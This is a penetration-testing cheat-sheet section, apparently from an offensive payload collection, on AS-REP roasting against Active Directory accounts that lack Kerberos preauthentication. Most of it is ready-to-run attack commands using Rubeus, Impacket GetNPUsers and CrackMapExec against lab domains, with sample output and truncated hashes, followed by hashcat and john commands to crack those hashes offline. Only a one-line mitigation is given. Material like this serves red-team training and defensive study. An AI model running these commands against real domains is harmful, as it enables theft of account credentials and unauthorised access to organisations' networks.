## KRB\_AS\_REP Roasting

> If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting

**Requirements**:

- Accounts with the attribute **DONT\_REQ\_PREAUTH** (`PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose`)
    
- [Rubeus](https://github.com/GhostPack/Rubeus)
    
    ```
    C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
    [*] Action: AS-REP roasting
    [*] Target User            : TestOU3user
    [*] Target Domain          : testlab.local
    [*] SamAccountName         : TestOU3user
    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local
    [*] Using domain controller: testlab.local (192.168.52.100)
    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\TestOU3user'
    [*] Connecting to 192.168.52.100:88
    [*] Sent 169 bytes
    [*] Received 1437 bytes
    [+] AS-REQ w/o preauth successful!
    [*] AS-REP hash:
    
    $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
    ```
    
- [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
    
    ```
    $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
    [*] Getting TGT for svc-alfresco
    $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4
    
    # extract hashes
    root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
    root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
    ```
    
- CrackMapExec Module
    
    ```
    $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
    LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
    ```
    

Using `hashcat` or `john` to crack the ticket.

```
# crack AS_REP messages with hashcat
root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
root@windows:hashcat$ hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt

# crack AS_REP messages with john
C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
```

**Mitigations**:

- All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).